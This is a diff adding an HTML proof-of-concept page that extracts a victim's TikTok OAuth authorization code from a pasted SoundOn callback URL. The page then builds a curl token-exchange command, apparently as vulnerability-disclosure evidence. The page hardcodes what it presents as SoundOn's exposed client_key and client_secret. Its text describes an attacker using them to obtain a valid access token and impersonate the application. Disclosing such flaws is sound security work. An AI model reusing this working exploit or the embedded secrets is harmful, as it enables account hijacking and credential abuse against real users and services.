@@ -1,0 +1,103 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>OAuth Code Extractor — PoC</title>
+<style>
+body { font-family: monospace; background: #0a0a0a; color: #0f0; padding: 40px; max-width: 800px; margin: 0 auto; }
+.section { background: #111; border: 1px solid #222; border-radius: 8px; padding: 20px; margin: 16px 0; }
+.label { color: #888; }
+.val { color: #ff0; word-break: break-all; }
+input { background: #222; color: #fff; border: 1px solid #333; padding: 12px; border-radius: 4px; font-size: 14px; font-family: monospace; width: 100%; }
+.btn { background: #fe2c55; color: #fff; border: none; padding: 12px 32px; border-radius: 6px; font-size: 15px; cursor: pointer; }
+.btn:disabled { background: #555; cursor: not-allowed; }
+.token-cmd { background: #000; border: 1px solid #333; border-radius: 4px; padding: 12px; overflow-x: auto; white-space: pre-wrap; color: #0ff; font-size: 13px; }
+.success { color: #0f0; }
+.warn { color: #fe2c55; }
+</style>
+</head>
+<body>
+<h1>Extract OAuth Authorization Code</h1>
+
+<div class="section">
+<h2>Step 1: Paste the callback URL from your browser address bar</h2>
+<p>The URL should look like:</p>
+<p class="val" style="font-size:12px">https://www.soundon.global/login/oauth/middle?code=zsb_-DDemMK...&scopes=user.info.basic...</p>
+<br>
+<input id="urlInput" type="text" placeholder="Paste the full URL from your browser address bar here">
+</div>
+
+<div class="section" id="resultSection" style="display:none">
+<h2>Step 2: Extracted Authorization Code</h2>
+<div><span class="label">code:</span> <span class="val" id="codeDisplay"></span></div>
+<div><span class="label">state:</span> <span class="val" id="stateDisplay">...</span></div>
+<div><span class="label">scopes:</span> <span class="val" id="scopeDisplay">...</span></div>
+</div>
+
+<div class="section" id="cmdSection" style="display:none">
+<h2>Step 3: Token Exchange Command</h2>
+<div class="token-cmd" id="cmdDisplay"></div>
+<br>
+<a class="btn" id="exchangeBtn" href="#" onclick="exchange();return false">Exchange Code for Token (opens in new tab)</a>
+</div>
+
+<div class="section" id="evidence" style="display:none">
+<h2 class="success">PoC Evidence Captured</h2>
+<p>The attacker now has the victim's TikTok OAuth authorization code.</p>
+<p>Because the <span class="warn">client_secret</span> is exposed in SoundOn's JavaScript,</p>
+<p>the attacker can exchange this code for a valid TikTok access token,</p>
+<p>impersonating the SoundOn application.</p>
+<br>
+<pre style="color:#0f0;overflow-x:auto" id="evidenceJson"></pre>
+</div>
+
+<script>
+document.getElementById("urlInput").addEventListener("input", function() {
+  const url = this.value.trim();
+  if (!url) return;
+  
+  try {
+    const u = new URL(url);
+    const code = u.searchParams.get("code");
+    const state = u.searchParams.get("state");
+    const scopes = u.searchParams.get("scopes");
+    
+    if (code) {
+      document.getElementById("resultSection").style.display = "block";
+      document.getElementById("cmdSection").style.display = "block";
+      document.getElementById("evidence").style.display = "block";
+      
+      document.getElementById("codeDisplay").textContent = code;
+      document.getElementById("stateDisplay").textContent = state || "none";
+      document.getElementById("scopeDisplay").textContent = scopes ? decodeURIComponent(scopes) : "none";
+      
+      const cmd = `curl -s "https://open-api.tiktok.com/oauth/access_token/" \\\n` +
+        `  -H "Content-Type: application/json" \\\n` +
+        `  -d '{"client_key":"awulj3e36brrh086","client_secret":"e63acb9afab646ee9340f16a2380b1ed","code":"${code}","grant_type":"authorization_code"}'`;
+      document.getElementById("cmdDisplay").textContent = cmd;
+      
+      document.getElementById("evidenceJson").textContent = JSON.stringify({
+        timestamp: new Date().toISOString(),
+        source_url: url,
+        code: code,
+        state: state,
+        scopes: scopes,
+        client_key: "awulj3e36brrh086",
+        client_secret: "e63acb9afab646ee9340f16a2380b1ed"
+      }, null, 2);
+    }
+  } catch(e) {
+    // invalid URL
+  }
+});
+
+function exchange() {
+  const code = document.getElementById("codeDisplay").textContent;
+  window.open("https://open-api.tiktok.com/oauth/access_token/", "_blank");
+  // In real attack, the attacker runs exchange_token.sh with the code
+  alert("Run this command in terminal:\n\n./exchange_token.sh \"" + code + "\"");
+}
+</script>
+</body>
+</html>
